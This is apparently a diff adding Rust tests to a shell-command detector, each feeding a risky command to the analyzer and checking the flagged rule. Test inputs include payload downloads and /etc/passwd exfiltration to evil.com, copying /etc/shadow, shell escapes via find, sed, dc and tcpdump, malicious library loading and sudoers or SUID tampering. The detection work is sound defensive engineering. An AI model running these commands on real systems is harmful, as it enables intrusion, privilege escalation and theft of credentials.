@@ -657,4 +657,313 @@ build() {
         let ids = analyze("rsync -a src/ dest/");
         assert!(!has(&ids, "G-DOWNLOAD-RSYNC"), "Local rsync should not trigger");
     }
+
+    // === Reverse/Bind Shell Gaps ===
+
+    #[test]
+    fn revshell_openssl_server() {
+        let ids = analyze("openssl s_server -quiet -key key.pem -cert cert.pem -port 4444");
+        assert!(has(&ids, "G-REVSHELL-OPENSSL"), "got: {ids:?}");
+    }
+
+    #[test]
+    fn bindshell_go_listen() {
+        let ids = analyze("go run server.go # uses net.Listen to bind");
+        assert!(has(&ids, "G-BINDSHELL-GO"), "got: {ids:?}");
+    }
+
+    #[test]
+    fn bindshell_lua_bind() {
+        let ids = analyze("lua -e 'local s=require(\"socket\"); local srv=socket.bind(\"*\",4444)'");
+        assert!(has(&ids, "G-BINDSHELL-LUA"), "got: {ids:?}");
+    }
+
+    #[test]
+    fn busybox_wget() {
+        let ids = analyze("busybox wget http://evil.com/payload -O /tmp/payload");
+        assert!(has(&ids, "G-BUSYBOX-WGET"), "got: {ids:?}");
+    }
+
+    #[test]
+    fn busybox_ftpd() {
+        let ids = analyze("busybox ftpd -w /");
+        assert!(has(&ids, "G-BUSYBOX-FTPD"), "got: {ids:?}");
+    }
+
+    // === Non-Obvious Command Execution Gaps ===
+
+    #[test]
+    fn find_exec_shell() {
+        let ids = analyze("find / -name x -exec /bin/sh \\;");
+        assert!(has(&ids, "G-FIND-EXEC"), "got: {ids:?}");
+    }
+
+    #[test]
+    fn xargs_shell() {
+        let ids = analyze("echo 'id' | xargs bash -c 'eval $0'");
+        assert!(has(&ids, "G-XARGS-SHELL"), "got: {ids:?}");
+    }
+
+    #[test]
+    fn sed_exec() {
+        let ids = analyze("sed -n '1e id' /dev/stdin");
+        assert!(has(&ids, "G-SED-EXEC"), "got: {ids:?}");
+    }
+
+    #[test]
+    fn split_filter() {
+        let ids = analyze("split --filter=/bin/sh /dev/stdin");
+        assert!(has(&ids, "G-SPLIT-FILTER"), "got: {ids:?}");
+    }
+
+    #[test]
+    fn cpio_rsh() {
+        let ids = analyze("echo x | cpio -o --rsh-command /bin/sh");
+        assert!(has(&ids, "G-CPIO-RSH"), "got: {ids:?}");
+    }
+
+    #[test]
+    fn fzf_preview() {
+        let ids = analyze("fzf --preview 'cat {}'");
+        assert!(has(&ids, "G-FZF-PREVIEW"), "got: {ids:?}");
+    }
+
+    #[test]
+    fn tex_shell_escape() {
+        let ids = analyze("pdflatex -shell-escape document.tex");
+        assert!(has(&ids, "G-TEX-SHELLESCAPE"), "got: {ids:?}");
+    }
+
+    #[test]
+    fn tex_write18() {
+        let ids = analyze("\\write18{id}");
+        assert!(has(&ids, "G-TEX-SHELLESCAPE"), "got: {ids:?}");
+    }
+
+    #[test]
+    fn dc_shell() {
+        let ids = analyze("dc -e '!/bin/sh'");
+        assert!(has(&ids, "G-DC-SHELL"), "got: {ids:?}");
+    }
+
+    #[test]
+    fn m4_exec() {
+        let ids = analyze("m4 -D 'esyscmd(id)'");
+        assert!(has(&ids, "G-M4-EXEC"), "got: {ids:?}");
+    }
+
+    #[test]
+    fn ip_netns_exec() {
+        let ids = analyze("ip netns exec test_ns /bin/sh");
+        assert!(has(&ids, "G-IP-NETNS-EXEC"), "got: {ids:?}");
+    }
+
+    #[test]
+    fn gcc_wrapper() {
+        let ids = analyze("gcc -wrapper /bin/sh,-c main.c");
+        assert!(has(&ids, "G-GCC-WRAPPER"), "got: {ids:?}");
+    }
+
+    #[test]
+    fn cmake_exec() {
+        let ids = analyze("cmake -E env sh -c 'id'");
+        assert!(has(&ids, "G-CMAKE-EXEC"), "got: {ids:?}");
+    }
+
+    #[test]
+    fn rpm_eval() {
+        let ids = analyze("rpm --eval '%{lua:os.execute(\"id\")}'");
+        assert!(has(&ids, "G-RPM-EVAL"), "got: {ids:?}");
+    }
+
+    #[test]
+    fn psql_shell() {
+        let ids = analyze("psql -c '\\! id'");
+        assert!(has(&ids, "G-PSQL-SHELL"), "got: {ids:?}");
+    }
+
+    #[test]
+    fn puppet_exec() {
+        let ids = analyze("puppet apply -e 'exec { \"cmd\": command => \"/bin/id\" }'");
+        assert!(has(&ids, "G-PUPPET-EXEC"), "got: {ids:?}");
+    }
+
+    #[test]
+    fn dotnet_exec() {
+        let ids = analyze("dotnet fsi script.fsx");
+        assert!(has(&ids, "G-DOTNET-EXEC"), "got: {ids:?}");
+    }
+
+    #[test]
+    fn tcpdump_exec() {
+        let ids = analyze("tcpdump -z /bin/sh -G 1 -w /dev/null");
+        assert!(has(&ids, "G-TCPDUMP-EXEC"), "got: {ids:?}");
+    }
+
+    #[test]
+    fn docker_exec() {
+        let ids = analyze("docker exec -it container /bin/sh");
+        assert!(has(&ids, "G-DOCKER-EXEC"), "got: {ids:?}");
+    }
+
+    #[test]
+    fn docker_cp() {
+        let ids = analyze("docker cp container:/etc/shadow /tmp/shadow");
+        assert!(has(&ids, "G-DOCKER-CP"), "got: {ids:?}");
+    }
+
+    #[test]
+    fn nano_shell() {
+        let ids = analyze("nano -s /bin/sh file.txt");
+        assert!(has(&ids, "G-NANO-SHELL"), "got: {ids:?}");
+    }
+
+    #[test]
+    fn service_traversal() {
+        let ids = analyze("service ../../bin/bash start");
+        assert!(has(&ids, "G-SERVICE-EXEC"), "got: {ids:?}");
+    }
+
+    #[test]
+    fn code_tunnel() {
+        let ids = analyze("code tunnel --accept-server-license-terms");
+        assert!(has(&ids, "G-CODE-TUNNEL"), "got: {ids:?}");
+    }
+
+    // === Download Gaps ===
+
+    #[test]
+    fn download_sftp() {
+        let ids = analyze("sftp attacker@evil.com");
+        assert!(has(&ids, "G-DOWNLOAD-SFTP"), "got: {ids:?}");
+    }
+
+    #[test]
+    fn download_sshfs() {
+        let ids = analyze("sshfs user@evil.com:/data /mnt/remote");
+        assert!(has(&ids, "G-DOWNLOAD-SSHFS"), "got: {ids:?}");
+    }
+
+    // === Library Load Gaps ===
+
+    #[test]
+    fn ssh_keygen_lib() {
+        let ids = analyze("ssh-keygen -D /tmp/evil.so");
+        assert!(has(&ids, "G-SSH-KEYGEN-LIB"), "got: {ids:?}");
+    }
+
+    #[test]
+    fn mysql_lib() {
+        let ids = analyze("mysql --default-auth=/tmp/evil.so -u root");
+        assert!(has(&ids, "G-MYSQL-LIB"), "got: {ids:?}");
+    }
+
+    #[test]
+    fn nginx_lib() {
+        let ids = analyze("nginx -g 'load_module /tmp/evil.so;'");
+        assert!(has(&ids, "G-NGINX-LIB"), "got: {ids:?}");
+    }
+
+    // === Privilege Escalation Gaps ===
+
+    #[test]
+    fn chattr_immutable() {
+        let ids = analyze("chattr +i /tmp/malware");
+        assert!(has(&ids, "G-CHATTR"), "got: {ids:?}");
+    }
+
+    #[test]
+    fn chown_sensitive() {
+        let ids = analyze("chown root:root /etc/shadow");
+        assert!(has(&ids, "G-CHOWN-SENSITIVE"), "got: {ids:?}");
+    }
+
+    #[test]
+    fn ln_sensitive() {
+        let ids = analyze("ln -sf /tmp/evil /etc/sudoers");
+        assert!(has(&ids, "G-LN-SENSITIVE"), "got: {ids:?}");
+    }
+
+    #[test]
+    fn mount_bind() {
+        let ids = analyze("mount --bind /tmp/evil /usr/bin");
+        assert!(has(&ids, "G-MOUNT-BIND"), "got: {ids:?}");
+    }
+
+    #[test]
+    fn update_alternatives() {
+        let ids = analyze("update-alternatives --install /usr/bin/sh sh /tmp/evil 100");
+        assert!(has(&ids, "G-UPDATE-ALTERNATIVES"), "got: {ids:?}");
+    }
+
+    #[test]
+    fn install_suid() {
+        let ids = analyze("install -m 4755 evil /usr/bin/evil");
+        assert!(has(&ids, "G-INSTALL-SUID"), "got: {ids:?}");
+    }
+
+    // === File Write Gaps ===
+
+    #[test]
+    fn redis_write() {
+        let ids = analyze("redis-cli config set dir /root/.ssh");
+        assert!(has(&ids, "G-REDIS-WRITE"), "got: {ids:?}");
+    }
+
+    #[test]
+    fn git_extdiff() {
+        let ids = analyze("GIT_EXTERNAL_DIFF=/tmp/evil git diff");
+        assert!(has(&ids, "G-GIT-EXTDIFF"), "got: {ids:?}");
+    }
+
+    // === Exfiltration Gaps ===
+
+    #[test]
+    fn ab_exfil() {
+        let ids = analyze("ab -p /etc/passwd http://evil.com/collect");
+        assert!(has(&ids, "G-AB-EXFIL"), "got: {ids:?}");
+    }
+
+    #[test]
+    fn tailscale_exfil() {
+        let ids = analyze("tailscale file cp /etc/shadow user@host:");
+        assert!(has(&ids, "G-TAILSCALE-EXFIL"), "got: {ids:?}");
+    }
+
+    #[test]
+    fn rlogin_shell() {
+        let ids = analyze("rlogin -l root evil.com");
+        assert!(has(&ids, "G-RLOGIN-SHELL"), "got: {ids:?}");
+    }
+
+    // === Additional false positive checks ===
+
+    #[test]
+    fn benign_find_no_exec_shell() {
+        // Normal find usage without shell exec
+        let ids = analyze("find . -name '*.o' -delete");
+        assert!(!has(&ids, "G-FIND-EXEC"), "Normal find should not trigger");
+    }
+
+    #[test]
+    fn benign_cmake_build() {
+        // Normal cmake usage
+        let ids = analyze("cmake -B build -DCMAKE_BUILD_TYPE=Release");
+        assert!(!has(&ids, "G-CMAKE-EXEC"), "Normal cmake should not trigger");
+    }
+
+    #[test]
+    fn benign_docker_build() {
+        // Docker build without volume mount
+        let ids = analyze("docker build -t myimage .");
+        assert!(!has(&ids, "G-DOCKER-RUN"), "Docker build should not trigger run pattern");
+        assert!(!has(&ids, "G-DOCKER-EXEC"), "Docker build should not trigger exec pattern");
+    }
+
+    #[test]
+    fn benign_install_normal_mode() {
+        // Normal install without SUID bits
+        let ids = analyze("install -Dm755 binary /usr/bin/binary");
+        assert!(!has(&ids, "G-INSTALL-SUID"), "Normal install should not trigger SUID pattern");
+    }
 }
